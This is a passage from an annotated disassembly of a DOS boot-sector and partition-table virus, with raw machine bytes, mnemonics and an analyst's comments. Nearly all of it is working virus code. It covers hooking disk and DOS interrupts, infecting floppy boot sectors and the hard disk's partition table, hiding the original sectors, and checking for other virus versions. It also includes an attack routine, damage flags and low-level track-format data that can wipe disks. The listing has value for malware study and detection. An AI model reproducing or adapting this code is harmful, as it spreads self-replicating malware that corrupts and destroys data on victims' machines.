TOP:0592  F3A4           REP    MOVSB           ; Copy block
TOP:0594  9D             POPF
TOP:0595  1F             POP    DS
TOP:0596  5F             POP    DI
TOP:0597  5A             POP    DX
TOP:0598  59             POP    CX
TOP:0599  58             POP    AX
TOP:059A  5B             POP    BX
TOP:059B  F8             CLC
TOP:059C  C3             RET                    ; Return

TOP:059D  BB0011         MOV    BX,1100         ; Write boot sector to floppy
TOP:05A0  B80103         MOV    AX,0301         ; Check for writing !
TOP:05A3  B90100         MOV    CX,0001
TOP:05A6  BA0000         MOV    DX,0000
TOP:05A9  0E             PUSH   CS
TOP:05AA  07             POP    ES
TOP:05AB  E8FCFB         CALL   01AA            ; Call original INT13
TOP:05AE  7303           JNC    05B3            ; If error
TOP:05B0  E93901         JMP    06EC            ;  jump to original INT13


TOP:05B3  0E           * PUSH   CS              ; Save disk parameters
TOP:05B4  1F             POP    DS
TOP:05B5  BB0011         MOV    BX,1100
TOP:05B8  8B4718         MOV    AX,[BX+18]      ; Sector/track
TOP:05BB  2EA30406       MOV    CS:[0604],AX
TOP:05BF  8B4F1A         MOV    CX,[BX+1A]      ; Head number
TOP:05C2  F7E1           MUL    CX
TOP:05C4  8BC8           MOV    CX,AX           ; CX = Heads * sector/track
TOP:05C6  8B4713         MOV    AX,[BX+13]      ; AX = number of total sectors
TOP:05C9  BA0000         MOV    DX,0000
TOP:05CC  F7F1           DIV    CX              ; AX = AX/CX
                                                ; AX = number of tracks
TOP:05CE  2EA20106       MOV    CS:[0601],AL    ; Save number of tracks
TOP:05D2  8AE8           MOV    CH,AL
TOP:05D4  B001           MOV    AL,01
TOP:05D6  90             NOP
TOP:05D7  B105           MOV    CL,05
TOP:05D9  B405           MOV    AH,05           ; INT13 SubFn: Format a track
TOP:05DB  0E             PUSH   CS
TOP:05DC  07             POP    ES
TOP:05DD  BA0000         MOV    DX,0000
TOP:05E0  51             PUSH   CX
TOP:05E1  2E813E02060703 CMP    CS:[0602],0307  ; Other version of virus ?
TOP:05E8  F8             CLC
TOP:05E9  740C           JZ     05F7
TOP:05EB  2E803EFD0400   CMP    CS:[04FD],00    ; No infection ?
TOP:05F1  F8             CLC
TOP:05F2  7403           JZ     05F7

TOP:05F4  E8D3FB         CALL   01CA            ; Call format a track !

TOP:05F7  1E             PUSH   DS
TOP:05F8  50             PUSH   AX
TOP:05F9  58             POP    AX
TOP:05FA  1F             POP    DS
TOP:05FB  59             POP    CX
TOP:05FC  7308           JNC    0606            ; If error
TOP:05FE  E9EB00         JMP    06EC            ;  jump to original INT13

TOP:0601  28             DB     28              ; Number of tracks
TOP:0602  0803           DW     308             ; 0308: If the same virus found
                                                ; 0307: Other version found
                                                ; Load it to AX, before calling
                                                ;  INT13: 03: write sector
                                                ;         07/08: number of sect
TOP:0604  0900           DW     9               ; Sectors / track

TOP:0606  BE0011         MOV    SI,1100         ; Copy boot sector to 0F00
TOP:0609  BF000F         MOV    DI,0F00         ;  (Save the original boot)
TOP:060C  0E             PUSH   CS
TOP:060D  1F             POP    DS
TOP:060E  51             PUSH   CX
TOP:060F  B90001         MOV    CX,0100
TOP:0612  9C             PUSHF
TOP:0613  FC             CLD
TOP:0614  F3A5           REP    MOVSW
TOP:0616  9D             POPF
TOP:0617  59             POP    CX

                                                ; Call INT13 with the action
                                                ;  saved in [0602]/W (AX)
TOP:0618  51             PUSH   CX              ; 0307: Write 7 sectors
TOP:0619  2EA10206       MOV    AX,CS:[0602]            (0100-0EFF)
TOP:061D  BA0000         MOV    DX,0000         ; 0308: Write 8 sectors
TOP:0620  B101           MOV    CL,01                   (0100-10FF)
TOP:0622  BB0001         MOV    BX,0100
TOP:0625  2E803EFD0400   CMP    CS:[04FD],00    ; Check infection flag
TOP:062B  F8             CLC
TOP:062C  7403           JZ     0631
TOP:062E  E879FB         CALL   01AA
TOP:0631  59           * POP    CX
TOP:0632  7303           JNC    0637            ; If error
TOP:0634  E9B500         JMP    06EC            ;  jump to original INT13

TOP:0637  0E           * PUSH   CS              ; Search for indentical string
TOP:0638  1F             POP    DS              ;  in the boot sector
TOP:0639  51             PUSH   CX
TOP:063A  BB0011         MOV    BX,1100
TOP:063D  B8FBCD         MOV    AX,CDFB         ; Indentical string:
TOP:0640  BA1372         MOV    DX,7213         ;  FB CD 13 72
TOP:0643  B90002         MOV    CX,0200
TOP:0646  E82DFD         CALL   0376
TOP:0649  59             POP    CX
TOP:064A  7403           JZ     064F            ; If not found
TOP:064C  E99D00         JMP    06EC            ;  jump to original INT13
TOP:064F  53             PUSH   BX
TOP:0650  51             PUSH   CX              ; Search for other identical
TOP:0651  B90001         MOV    CX,0100         ;  string after the previous
TOP:0654  B832E4         MOV    AX,E432         ; Indentical string2:
TOP:0657  BACD16         MOV    DX,16CD         ;  32 E4 CD 16
TOP:065A  E819FD         CALL   0376
TOP:065D  7405           JZ     0664
TOP:065F  59             POP    CX              ; If not found
TOP:0660  5B             POP    BX              ;  jump to original INT13
TOP:0661  E98800         JMP    06EC


                                                ; Save Start & End address
TOP:0664  83EB06       * SUB    BX,0006         ;  of infected code
TOP:0667  2E891E0D01     MOV    CS:[010D],BX    ;  in boot sector
TOP:066C  59             POP    CX
TOP:066D  5B             POP    BX
TOP:066E  83C305         ADD    BX,0005
TOP:0671  2E891E0F01     MOV    CS:[010F],BX
TOP:0676  2E882E9207     MOV    CS:[0792],CH
TOP:067B  51             PUSH   CX
TOP:067C  BE7B07         MOV    SI,077B
TOP:067F  2E8B1E0F01     MOV    BX,CS:[010F]
TOP:0684  B94300         MOV    CX,0043
TOP:0687  0E             PUSH   CS
TOP:0688  1F             POP    DS

TOP:0689  8A04         * MOV    AL,[SI]         ; Copy infected code to
TOP:068B  8807           MOV    [BX],AL         ;  boot sector
TOP:068D  43             INC    BX
TOP:068E  46             INC    SI
TOP:068F  E2F8           LOOP   0689

TOP:0691  C60790       * MOV    [BX],90         ; Fill the unusable area
TOP:0694  43             INC    BX              ;  with NOPs
TOP:0695  2E3B1E0D01     CMP    BX,CS:[010D]
TOP:069A  72F5           JC     0691

                                                ; Write infected boot to disk
TOP:069C  59             POP    CX
TOP:069D  B90300         MOV    CX,0003         ; 3 probe
TOP:06A0  51           * PUSH   CX
TOP:06A1  B90100         MOV    CX,0001
TOP:06A4  BA0000         MOV    DX,0000
TOP:06A7  B80103         MOV    AX,0301         ; Write 1 sector
TOP:06AA  BB0011         MOV    BX,1100
TOP:06AD  0E             PUSH   CS
TOP:06AE  07             POP    ES
TOP:06AF  E8F8FA         CALL   01AA            ; Call INT13
TOP:06B2  720F           JC     06C3            ; Jump, if error
TOP:06B4  59             POP    CX
TOP:06B5  2E803EFD0400   CMP    CS:[04FD],00
TOP:06BB  7503           JNZ    06C0
TOP:06BD  E9AEFE         JMP    056E            ; Jump to return to caller
TOP:06C0  E93CFE       * JMP    04FF            ; If FLAG_4FD!=0
TOP:06C3  59           * POP    CX
TOP:06C4  E2DA           LOOP   06A0
TOP:06C6  EB24           JMP    06EC            ; 3 error
TOP:06C8  90             NOP

TOP:06C9  90           * NOP                    ; Create INT21 vector
TOP:06CA  B080           MOV    AL,80
TOP:06CC  2EA2A201       MOV    CS:[01A2],AL

TOP:06D0  26A18400       MOV    AX,ES:[0084]    ; Save INT 21
TOP:06D4  2EA39901       MOV    CS:[0199],AX
TOP:06D8  26A18600       MOV    AX,ES:[0086]
TOP:06DC  2EA39B01       MOV    CS:[019B],AX
TOP:06E0  B84002         MOV    AX,0240         ; Set INT 21 to TOP:0240
TOP:06E3  26A38400       MOV    ES:[0084],AX
TOP:06E7  268C0E8600     MOV    ES:[0086],CS

TOP:06EC  5E           * POP    SI
TOP:06ED  5F             POP    DI
TOP:06EE  1F             POP    DS
TOP:06EF  07             POP    ES
TOP:06F0  5A             POP    DX
TOP:06F1  59             POP    CX
TOP:06F2  58             POP    AX
TOP:06F3  5B             POP    BX
TOP:06F4  E99CFA         JMP    0193            ; Jump to original INT13

TOP:06F7  0E             PUSH   CS              ; ATTACK rutine
TOP:06F8  1F             POP    DS
TOP:06F9  2EC706720B8070 MOV    CS:[0B72],7080  ; ?

TOP:0700  33C0           XOR    AX,AX           ; Clear FLAGs (1-6)
TOP:0702  56             PUSH   SI
TOP:0703  57             PUSH   DI
TOP:0704  51             PUSH   CX
TOP:0705  FC             CLD
TOP:0706  BFA201         MOV    DI,01A2
TOP:0709  BEA801         MOV    SI,01A8
TOP:070C  AA             STOSB
TOP:070D  3BFE           CMP    DI,SI
TOP:070F  72FB           JC     070C
TOP:0711  59             POP    CX
TOP:0712  5F             POP    DI
TOP:0713  5E             POP    SI

TOP:0714  8EC0           MOV    ES,AX           ; Load 80 to FLAG1
TOP:0716  2EC606A20180   MOV    CS:[01A2],80

TOP:071C  26A14C00       MOV    AX,ES:[004C]    ; Save INT13 vector
TOP:0720  2EA39401       MOV    CS:[0194],AX
TOP:0724  26A14E00       MOV    AX,ES:[004E]
TOP:0728  2EA39601       MOV    CS:[0196],AX

TOP:072C  B8A003         MOV    AX,03A0         ; Set INT13 vector to CS:03A0
TOP:072F  26A34C00       MOV    ES:[004C],AX
TOP:0733  268C0E4E00     MOV    ES:[004E],CS

TOP:0738  B80102         MOV    AX,0201         ; Load a sector from hard disk
TOP:073B  BB0013         MOV    BX,1300         ;  to CS:1300
TOP:073E  0E             PUSH   CS
TOP:073F  07             POP    ES
TOP:0740  BA8001         MOV    DX,0180         ; 1. head , drive number=80
TOP:0743  B90100         MOV    CX,0001         ; 0. track, 1. sector
TOP:0746  CD13           INT    13

TOP:0748  B80000         MOV    AX,0000         ; Restore INT13 vector
TOP:074B  8EC0           MOV    ES,AX
TOP:074D  2EA19401       MOV    AX,CS:[0194]
TOP:0751  26A34C00       MOV    ES:[004C],AX
TOP:0755  2EA19601       MOV    AX,CS:[0196]
TOP:0759  26A34E00       MOV    ES:[004E],AX

TOP:075D  B800F0         MOV    AX,F000         ; Save original reset vector
TOP:0760  8EC0           MOV    ES,AX
TOP:0762  26A0F0FF       MOV    AL,ES:[FFF0]
TOP:0766  3CEA           CMP    AL,EA
TOP:0768  7510           JNZ    077A
TOP:076A  26A1F1FF       MOV    AX,ES:[FFF1]
TOP:076E  2EA32C03       MOV    CS:[032C],AX
TOP:0772  26A1F3FF       MOV    AX,ES:[FFF3]
TOP:0776  2EA32E03       MOV    CS:[032E],AX
TOP:077A  CB             RET    Far             ; Return to caller

;-----------------------------------------------------------------------------
;       The original boot sector's first part as the same
;       It loads at 0:7C00
;
; BOOT:0000  EB34           JMP    0036
; BOOT:0002  90             NOP
;
; BOOT:0003            49 42 4D 20 20 33 2E 32 00 02 02 01 00   .4.IBM  3.2....
; BOOT:0010   02 70 00 D0 02 FD 02 00 09 00 02 00 00 00 00 00   .p.............
; BOOT:0020   00 00 00 00 00 00 00 00 00 00 00
; BOOT:002B                                    00 00 00 00 0F   ...............
; BOOT:0030   00 00 00 00 01 00                                 ......
;
; BOOT:0036  FA           * CLI                   ; Main Entry Point
; BOOT:0037  33C0           XOR    AX,AX
; BOOT:0039  8ED0           MOV    SS,AX
; BOOT:003B  BC007C         MOV    SP,7C00
; BOOT:003E  16             PUSH   SS
; BOOT:003F  07             POP    ES
; BOOT:0040  BB7800         MOV    BX,0078
; BOOT:0043  36C537         LDS    SI,SS:[BX]     ; DS:SI points to
;                                                 ;   Diskette Parameters
; BOOT:0046  1E             PUSH   DS             ; Copy DPT parameters to
; BOOT:0047  56             PUSH   SI             ;  own data area
; BOOT:0048  16             PUSH   SS
; BOOT:0049  53             PUSH   BX
; BOOT:004A  BF2B7C         MOV    DI,7C2B
; BOOT:004D  B90B00         MOV    CX,000B
; BOOT:0050  FC             CLD
; BOOT:0051  AC           * LODSB
; BOOT:0052  26803D00       CMP    ES:[DI],00     ; If own data is zero
; BOOT:0056  7403           JZ     005B
; BOOT:0058  268A05         MOV    AL,ES:[DI]
; BOOT:005B  AA           * STOSB
; BOOT:005C  8AC4           MOV    AL,AH
; BOOT:005E  E2F1           LOOP   0051
;
; BOOT:0060  06             PUSH   ES             ; Change DTP address
; BOOT:0061  1F             POP    DS             ;   ( INT 1E )
; BOOT:0062  894702         MOV    [BX+02],AX
; BOOT:0065  C7072B7C       MOV    [BX],7C2B
;
; BOOT:0069  FB             STI
; BOOT:006A  CD13           INT    13             ; Reset disk
; BOOT:006C  7267           JC     00D5           ;  If error -> jmp error rutine
;
; The virus code loads here


TOP:077B  CD12           INT    12              ; Infection code in boot sector

TOP:077D  BB4000         MOV    BX,0040         ; Start of the virus
TOP:0780  F7E3           MUL    BX              ; Get Unusable memory size
TOP:0782  2D0010         SUB    AX,1000         ;  (same as 0:413)
TOP:0785  8EC0           MOV    ES,AX
TOP:0787  BA0000         MOV    DX,0000         ; Value in pharagraphs
TOP:078A  EB04           JMP    0790            ; "Allocate" memory on TOP
TOP:078C  90             NOP

TOP:078D  17             DB     17              ; Virus Version Information
TOP:078E  0006           DW     0600


TOP:0790  B90128         MOV    CX,2801         ; Set value for loading
                                                ; from 40. track 1. sector
TOP:0793  B80802         MOV    AX,0208         ;  virus code
TOP:0796  BB0001         MOV    BX,0100
TOP:0799  53             PUSH   BX
TOP:079A  26813F5224     CMP    ES:[BX],2452    ; Memory is infected ?
TOP:079F  740B           JZ     07AC
                                                ; No (,not yet)
TOP:07A1  CD13           INT    13              ; Load 8 sectors to TOP:0100
TOP:07A3  5B             POP    BX
TOP:07A4  7218           JC     07BE            ; Jump to the error routine
TOP:07A6  06             PUSH   ES
TOP:07A7  B80201         MOV    AX,0102         ; Jump to TOP:102
TOP:07AA  50           * PUSH   AX
TOP:07AB  CB             RET    Far
                                                ; Memory is infected !
TOP:07AC  BB000F       * MOV    BX,0F00         ; Load original boot sector
TOP:07AF  B001           MOV    AL,01
TOP:07B1  B108           MOV    CL,08
TOP:07B3  CD13           INT    13              ; Load 1 sector to TOP:0F00
TOP:07B5  5B             POP    BX
TOP:07B6  7206           JC     07BE            ; Error ?
TOP:07B8  06             PUSH   ES
TOP:07B9  B80501         MOV    AX,0105         ; Jump to TOP:105
TOP:07BC  EBEC           JMP    07AA

;                      *                        ; From here,
                                                ; this is a part of an original
                                                ; boot sector

;-----------------------------------------------------------------------------

TOP:07BE  90             NOP
TOP:07BF  90             NOP

TOP:07C0  E9B700       * JMP    087A            ; INT 13 and DL=80

TOP:07C3  2EA0A301     * MOV    AL,CS:[01A3]    ; Check FLAG2
TOP:07C7  3C80           CMP    AL,80
TOP:07C9  7403           JZ     07CE
TOP:07CB  E91EFF         JMP    06EC            ; Jump to original INT13

                                                ; Check, if read or write the
                                                ;  1st absolute sector on
                                                ;  hard drive, and repleace it
                                                ;  with the other
TOP:07CE  5E           * POP    SI              ; Save registers
TOP:07CF  5F             POP    DI
TOP:07D0  1F             POP    DS
TOP:07D1  07             POP    ES
TOP:07D2  5A             POP    DX
TOP:07D3  59             POP    CX
TOP:07D4  58             POP    AX
TOP:07D5  5B             POP    BX
TOP:07D6  80FD00         CMP    CH,00           ; Check track number
TOP:07D9  7403           JZ     07DE
TOP:07DB  EB4B           JMP    0828            ; Jump call INT13
TOP:07DD  90             NOP
TOP:07DE  80F90A         CMP    CL,0A           ; Check sector number and
TOP:07E1  7203           JC     07E6            ;  2 bits of track number
TOP:07E3  EB43           JMP    0828            ; Jump call INT13
TOP:07E5  90             NOP
TOP:07E6  80FE00         CMP    DH,00           ; Check head number
TOP:07E9  7403           JZ     07EE
TOP:07EB  EB3B           JMP    0828            ; Jump call INT13
TOP:07ED  90             NOP

TOP:07EE  80FC03         CMP    AH,03           ; Check for writing
TOP:07F1  753B           JNZ    082E

                                                ; Write sector
TOP:07F3  2EC606A30100   MOV    CS:[01A3],00    ; Load 0 to FLAG2

TOP:07F9  50             PUSH   AX              ; Save registers
TOP:07FA  53             PUSH   BX
TOP:07FB  51             PUSH   CX
TOP:07FC  52             PUSH   DX
TOP:07FD  BA8000         MOV    DX,0080         ; Read the original Part. Tabl.
TOP:0800  B80102         MOV    AX,0201
TOP:0803  B90900         MOV    CX,0009
TOP:0806  BB0011         MOV    BX,1100
TOP:0809  06             PUSH   ES
TOP:080A  0E             PUSH   CS
TOP:080B  07             POP    ES
TOP:080C  BA8000         MOV    DX,0080
TOP:080F  E898F9         CALL   01AA            ; Call INT13
TOP:0812  720F           JC     0823

TOP:0814  B80103         MOV    AX,0301         ; Write original Part. Tabl.
TOP:0817  B90100         MOV    CX,0001         ;  to the absolute 1st sector
TOP:081A  BA8000         MOV    DX,0080
TOP:081D  BB0011         MOV    BX,1100
TOP:0820  E887F9         CALL   01AA            ; Call INT13
TOP:0823  07           * POP    ES              ; Restore registers
TOP:0824  5A             POP    DX
TOP:0825  59             POP    CX
TOP:0826  5B             POP    BX
TOP:0827  58             POP    AX

TOP:0828  E87FF9       * CALL   01AA            ; Call INT13
TOP:082B  E94DFC         JMP    047B            ; Jump return to caller

TOP:082E  80FC02         CMP    AH,02
TOP:0831  75F5           JNZ    0828            ; Jump call INT13

TOP:0833  57             PUSH   DI              ; Save registers
TOP:0834  51             PUSH   CX
TOP:0835  52             PUSH   DX
TOP:0836  53             PUSH   BX
TOP:0837  50             PUSH   AX
TOP:0838  50             PUSH   AX

TOP:0839  B400           MOV    AH,00           ; DI = number of sectors
TOP:083B  8BF8           MOV    DI,AX
TOP:083D  58             POP    AX

                                                ; Read sectors step by step
TOP:083E  51           * PUSH   CX
TOP:083F  80F901         CMP    CL,01           ; Check, if the Part. Table
TOP:0842  7505           JNZ    0849
TOP:0844  B109           MOV    CL,09           ; If not Part.Tabl.-> 9.sector.
TOP:0846  EB04           JMP    084C
TOP:0848  90             NOP
TOP:0849  B90A00       * MOV    CX,000A         ; If Part.Table->load 10.sector
TOP:084C  53           * PUSH   BX
TOP:084D  57             PUSH   DI
TOP:084E  B001           MOV    AL,01           ; Load 1 sector
TOP:0850  06             PUSH   ES
TOP:0851  B402           MOV    AH,02           ; Load code
TOP:0853  E854F9         CALL   01AA            ; Call INT13
TOP:0856  07             POP    ES
TOP:0857  5F             POP    DI
TOP:0858  5B             POP    BX
TOP:0859  59             POP    CX
TOP:085A  7214           JC     0870            ; Jump return with error
TOP:085C  81C30002       ADD    BX,0200         ; Increase buffer pointer
TOP:0860  B102           MOV    CL,02
TOP:0862  4F             DEC    DI
TOP:0863  75D9           JNZ    083E            ; Jump to read next sector

TOP:0865  58             POP    AX
TOP:0866  B400           MOV    AH,00           ; Set ERRCODE to no error

TOP:0868  5B             POP    BX              ; Restore registers
TOP:0869  5A             POP    DX
TOP:086A  59             POP    CX
TOP:086B  5F             POP    DI
TOP:086C  F8             CLC                    ; Clear Carry (No error)
TOP:086D  E90BFC         JMP    047B            ; Jump return to caller

TOP:0870  5B           * POP    BX              ; Restore registers
TOP:0871  5B             POP    BX
TOP:0872  5A             POP    DX
TOP:0873  59             POP    CX
TOP:0874  5F             POP    DI
TOP:0875  B000           MOV    AL,00
TOP:0877  E901FC         JMP    047B            ; Jump return to caller

                                                ; INT13 with the 1st hard drive
TOP:087A  2EA0A301     * MOV    AL,CS:[01A3]    ; Check FLAG2
TOP:087E  3C80           CMP    AL,80
TOP:0880  7503           JNZ    0885
TOP:0882  E93EFF         JMP    07C3            ; jump next if FLAG2 = 40 or 80
TOP:0885  3C40         * CMP    AL,40
TOP:0887  7503           JNZ    088C
TOP:0889  E937FF         JMP    07C3

                                                ; Read the Part.Table of
                                                ;  1. hard disk
TOP:088C  B90300       * MOV    CX,0003         ; 3 probe
TOP:088F  51             PUSH   CX
TOP:0890  BA8000         MOV    DX,0080
TOP:0893  B90100         MOV    CX,0001
TOP:0896  BB000F         MOV    BX,0F00         ; Address of buffer: CS:0F00
TOP:0899  B80102         MOV    AX,0201
TOP:089C  0E             PUSH   CS
TOP:089D  07             POP    ES
TOP:089E  E809F9         CALL   01AA            ; Call INT13
TOP:08A1  59             POP    CX
TOP:08A2  7305           JNC    08A9
TOP:08A4  E2E9           LOOP   088F
TOP:08A6  E91AFF       * JMP    07C3            ; If error jump next

                                                ; Read the boot sector of
                                                ;  1. partition on 1. hard disk
TOP:08A9  BA8001       * MOV    DX,0180
TOP:08AC  B90100         MOV    CX,0001
TOP:08AF  BB0011         MOV    BX,1100         ; Address of buffer: CS:1100
TOP:08B2  B80102         MOV    AX,0201
TOP:08B5  0E             PUSH   CS
TOP:08B6  07             POP    ES
TOP:08B7  E8F0F8         CALL   01AA            ; Call INT13
TOP:08BA  72EA           JC     08A6            ; If error jump next

TOP:08BC  BB0011         MOV    BX,1100         ; Check, if boot sector is
TOP:08BF  2E8B87FE01     MOV    AX,CS:[BX+01FE] ; a valid boot sector
TOP:08C4  3D55AA         CMP    AX,AA55
TOP:08C7  7408           JZ     08D1

TOP:08C9  2EC606A30140   MOV    CS:[01A3],40    ; If not, load 40 to FLAG2
TOP:08CF  EBD5           JMP    08A6            ; Jump next


TOP:08D1  0E           * PUSH   CS              ; Check, if Partition Table
TOP:08D2  1F             POP    DS              ;  is infected
TOP:08D3  B90300         MOV    CX,0003         ; Check 1st 3 bytes
TOP:08D6  BB000F         MOV    BX,0F00
TOP:08D9  BE4509         MOV    SI,0945
TOP:08DC  8A07         * MOV    AL,[BX]
TOP:08DE  3A04           CMP    AL,[SI]
TOP:08E0  7529           JNZ    090B
TOP:08E2  43             INC    BX
TOP:08E3  46             INC    SI
TOP:08E4  E2F6           LOOP   08DC

TOP:08E6  83EB03         SUB    BX,0003         ; Check version information
TOP:08E9  81C31100       ADD    BX,0011
TOP:08ED  8A07           MOV    AL,[BX]         ; Check the 1st byte
TOP:08EF  3C17           CMP    AL,17
TOP:08F1  7509           JNZ    08FC


                                                ; Check the word
TOP:08F3  8B841100       MOV    AX,[SI+0011]    ; This a fault: [SI+000F]
TOP:08F7  3B4701         CMP    AX,[BX+01]      ;  is correct, but if there is
TOP:08FA  7206           JC     0902            ;  only one version, that
                                                ;  no problem

TOP:08FC  B80703       * MOV    AX,0307         ; If the 1st byte != 17
TOP:08FF  EB0D           JMP    090E            ;  or the word smaller or equal
TOP:0901  90             NOP                    ; It's correct to write only
                                                ;  seven sectors

TOP:0902  2EC606A30180 * MOV    CS:[01A3],80    ; The har disk's already
TOP:0908  E9B8FE         JMP    07C3            ;  infected & that version
                                                ;  is grater than this
                                                ; Nothing to do ! Jump next


TOP:090B  B80803       * MOV    AX,0308         ; Hard disk is not infected
                                                ;  It's to write 8 sectors

TOP:090E  BA8000       * MOV    DX,0080         ; Write 7 or 8 sectors
TOP:0911  B90200         MOV    CX,0002         ; From the 2nd sector
TOP:0914  BB0001         MOV    BX,0100
TOP:0917  E890F8         CALL   01AA            ; Call INT13
TOP:091A  7303           JNC    091F
TOP:091C  E9A4FE         JMP    07C3            ; If error, jump next

TOP:091F  BE4509       * MOV    SI,0945         ; Copy infection code onto
TOP:0922  B94C00         MOV    CX,004C         ;  the buffer of
TOP:0925  BF000F         MOV    DI,0F00         ;  Partition Table
TOP:0928  9C             PUSHF
TOP:0929  FC             CLD
TOP:092A  F3A4           REP    MOVSB
TOP:092C  9D             POPF

TOP:092D  B80103         MOV    AX,0301         ; Write infected
TOP:0930  BA8000         MOV    DX,0080         ;  Partition Table to disk
TOP:0933  B90100         MOV    CX,0001
TOP:0936  BB000F         MOV    BX,0F00
TOP:0939  E86EF8         CALL   01AA
TOP:093C  2EC606A30180   MOV    CS:[01A3],80    ; Load 80 to FLAG2
TOP:0942  E97EFE         JMP    07C3            ; Jump next

;----------------------------------------------------------------------------

                                                ; Infection code in the
                                                ;  Partition Table
TOP:0945  CD12           INT    12              ; Get Unusable Memory Size
                                                ; (same as 0:413)

TOP:0947  BB4000         MOV    BX,0040         ; Value in pharagraphs
TOP:094A  F7E3           MUL    BX              ; Allocate memory on TOP
TOP:094C  2D0010         SUB    AX,1000         ; one segment ! (64Kbyte)
TOP:094F  8EC0           MOV    ES,AX
TOP:0951  33C0           XOR    AX,AX           ; Zero AX
TOP:0953  EB04           JMP    0959
TOP:0955  90             NOP

TOP:0956  17             DB     17              ; Virus Version Information
TOP:0957  0006           DW     0600

TOP:0959  8ED0         * MOV    SS,AX           ; Set SS:SP to 0:7C00
TOP:095B  BC007C         MOV    SP,7C00

TOP:095E  BA8000         MOV    DX,0080         ; Set registers for loading
TOP:0961  B90200         MOV    CX,0002         ; Virus Code Areas
TOP:0964  B80802         MOV    AX,0208         ; 8 sectors from the 2. to
TOP:0967  BB0001         MOV    BX,0100         ; TOP:100
TOP:096A  53             PUSH   BX              ; Save BX
TOP:096B  26813F5224     CMP    ES:[BX],2452    ; Memory is infected ?
TOP:0970  740B           JZ     097D
                                                ; Memory Isn't infected !
TOP:0972  CD13           INT    13              ; Load Virus Code: 8 sectors
TOP:0974  5B             POP    BX              ; Restore BX
TOP:0975  7218           JC     098F            ; If there was an Error
TOP:0977  06             PUSH   ES
TOP:0978  B80201         MOV    AX,0102         ; Jump to the 2. byte of VirCode
TOP:097B  50           * PUSH   AX
TOP:097C  CB             RET    Far

TOP:097D  BB000F       * MOV    BX,0F00         ; Yes, memory is infected !
TOP:0980  B001           MOV    AL,01           ; 1 sector
TOP:0982  B109           MOV    CL,09           ; from the 9.
TOP:0984  CD13           INT    13              ; Load the original Part.Table
TOP:0986  5B             POP    BX              ; Restore BX
TOP:0987  7206           JC     098F            ; If there was an Error
TOP:0989  06             PUSH   ES
TOP:098A  B80501         MOV    AX,0105         ; Jump to the 5. byte of VirCode
TOP:098D  EBEC           JMP    097B
TOP:098F  EBFE         * JMP    098F            ; If there was an Error

;----------------------------------------------------------------------------

TOP:0991  90             NOP
TOP:0992  90             NOP

TOP:0993  6911           DW     1169            ; The place,where the indentical
                                                ;  string found in boot sector


TOP:0995  FB             STI                    ; A part of a correct boot
TOP:0996  CD13           INT    13              ;  sector
TOP:0998  7267           JC     0A01            ; The 1st four byte is the
TOP:099A  A0107C         MOV    AL,[7C10]       ;  indentical string
TOP:099D  98             CBW
TOP:099E  F726167C       MUL    W/[7C16]
TOP:09A2  03061C7C       ADD    AX,[7C1C]
TOP:09A6  03060E7C       ADD    AX,[7C0E]
TOP:09AA  A33F7C         MOV    [7C3F],AX
TOP:09AD  A3377C         MOV    [7C37],AX
TOP:09B0  B82000         MOV    AX,0020
TOP:09B3  F726117C       MUL    W/[7C11]
TOP:09B7  8B1E0B7C       MOV    BX,[7C0B]
TOP:09BB  03C3           ADD    AX,BX
TOP:09BD  48             DEC    AX
TOP:09BE  F7F3           DIV    BX
TOP:09C0  0106377C       ADD    [7C37],AX
TOP:09C4  BB0005         MOV    BX,0500
TOP:09C7  A13F7C         MOV    AX,[7C3F]
TOP:09CA  E89F00         CALL   0A6C
TOP:09CD  B80102         MOV    AX,0201
TOP:09D0  E8B300         CALL   0A86
TOP:09D3  7219           JC     09EE
TOP:09D5  8BFB           MOV    DI,BX
TOP:09D7  B90B00         MOV    CX,000B
TOP:09DA  BED67D         MOV    SI,7DD6
TOP:09DD  F3A6           REP    CMPSB
TOP:09DF  750D           JNZ    09EE
TOP:09E1  8D7F20         LEA    DI,[BX+20]
TOP:09E4  BE1E7D         MOV    SI,7D1E
TOP:09E7  B90B00         MOV    CX,000B
TOP:09EA  F3A4           REP    MOVSB
TOP:09EC  7418           JZ     0A06            ; End of the original boot

TOP:09EE  0000           DW     0
TOP:09F0  0000           DW     0
TOP:09F2  0000           DW     0
TOP:09F4  0000           DW     0
TOP:09F6  0000           DW     0
TOP:09F8  0000           DW     0


TOP:09FA  DF 02 25 02 0F                ; Disk Parameter Table
          1B FF 54 F6 0F
          08

          4F 00 04                      ; +3 byte


TOP:0A08  D1 02 25 02 09                ; Disk Parameter Table
          2A FF 50 F6 0F
          04

          4F 80 05                      ; +3 byte


TOP:0A16  DF 02 25 02 09                ; Disk Parameter Table
          23 FF 50 F6 0F
          08

          27 28 03                      ; +3 byte


TOP:0A24  A1 02 25 02 12                ; Disk Parameter Table
          1B FF 60 F6 0F
          04

          4F 00 07                      ; +3 byte


TOP:0A32  2205           DW     0522            ; Address of Disk Parameter
TOP:0A34  0000           DW     0               ;  Table (saved)



TOP:0A36  0000           DW     0
TOP:0A38  0000           DW     0
TOP:0A3A  0000           DW     0
TOP:0A3C  0000           DW     0
TOP:0A3E  0000           DW     0
TOP:0A40  0000           DW     0

TOP:0A42  50 00 01 02                   ; Sector descriptor for low-level
          50 00 02 02                   ;  format
          50 00 03 02
          50 00 04 02                   ; Track,Head,Sector,SizeCode
          50 00 05 02                   ;  Sizecode = 2  -> Size = 512 bytes
          50 00 06 02
          50 00 07 02
          50 00 08 02
          50 00 09 02
          50 00 0A 02
          50 00 0B 02
          50 00 0C 02
          50 00 0D 02
          50 00 0E 02
          50 00 0F 02
          50 00 10 02
          50 00 11 02
          50 00 11 02
          50 00 12 02

TOP:0A8E  28 00 01 02                   ; Sector descriptor for low-level
          28 00 02 02                   ;  format
          28 00 03 02
          28 00 04 02                   ; Track,Head,Sector,SizeCode
          28 00 05 02                   ;  Sizecode = 2  -> Size = 512 bytes
          28 00 06 02
          28 00 07 02
          28 00 08 02
          28 00 09 02


TOP:0AB2  00             DB     0               ; Demage flag 1 (DMF1)
TOP:0AB3  00             DB     0               ; Demage flag 2 (DMF2)

TOP:0AB4  50             PUSH   AX              ; Save registers
TOP:0AB5  53             PUSH   BX
TOP:0AB6  51             PUSH   CX
TOP:0AB7  52             PUSH   DX
TOP:0AB8  06             PUSH   ES
TOP:0AB9  1E             PUSH   DS
TOP:0ABA  57             PUSH   DI
TOP:0ABB  56             PUSH   SI

TOP:0ABC  B80102         MOV    AX,0201         ; Load a sector from
TOP:0ABF  B90A00         MOV    CX,000A         ;  Cyl=0, Hd=0, Sec=0A
TOP:0AC2  BB000F         MOV    BX,0F00         ;  to CS:0F00
